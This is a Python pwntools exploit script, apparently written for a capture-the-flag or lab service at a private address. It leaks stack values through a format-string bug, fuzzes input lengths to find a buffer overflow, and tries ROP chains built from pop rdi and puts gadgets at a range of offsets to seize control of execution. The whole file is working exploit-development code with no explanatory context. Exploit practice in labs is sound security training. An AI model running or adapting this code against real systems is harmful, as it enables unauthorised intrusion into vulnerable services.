#!/usr/bin/env python3
from pwn import *

context.clear(arch="amd64")
context.log_level = "error"

HOST = "10.112.0.12"
PORT = 46083


def one(fmt: bytes):
    io = remote(HOST, PORT, timeout=4)
    io.recvuntil(b"Codename:\n", timeout=4)
    io.sendline(fmt)
    out = io.recvuntil(b"Packet length:", timeout=4)
    io.close()
    return out.split(b"AUDIT: ")[-1].split(b"\n")[0]


def send_payload(payload: bytes, timeout=1.2):
    io = remote(HOST, PORT, timeout=4)
    io.recvuntil(b"Codename:\n", timeout=4)
    io.sendline(b"x")
    io.sendlineafter(b"Packet length:\n", str(len(payload)).encode())
    io.sendafter(b"Packet data:\n", payload)
    data = io.recvall(timeout=timeout)
    io.close()
    return data


print("[fmt single]")
for i in range(1, 61):
    try:
        print(i, one(f"%{i}$p".encode()).decode(errors="replace"))
    except Exception as e:
        print(i, type(e).__name__)

print("[length]")
for n in range(80, 161, 8):
    try:
        data = send_payload(b"A" * n)
        print(n, len(data), repr(data), b"Session closed" in data)
    except Exception as e:
        print(n, type(e).__name__)

print("[rop puts candidates]")
base = 0x400000
ret = base + 0x13af
pop_rdi = base + 0x13b0
puts = base + 0x1030
banner = base + 0x205c
for off in range(0x58, 0x91, 8):
    for pad in (b"", p64(ret)):
        try:
            payload = b"A" * off + pad + p64(pop_rdi) + p64(banner) + p64(puts)
            data = send_payload(payload)
            print(hex(off), "retpad" if pad else "plain", len(data), repr(data[:120]))
        except Exception as e:
            print(hex(off), "ERR", type(e).__name__)
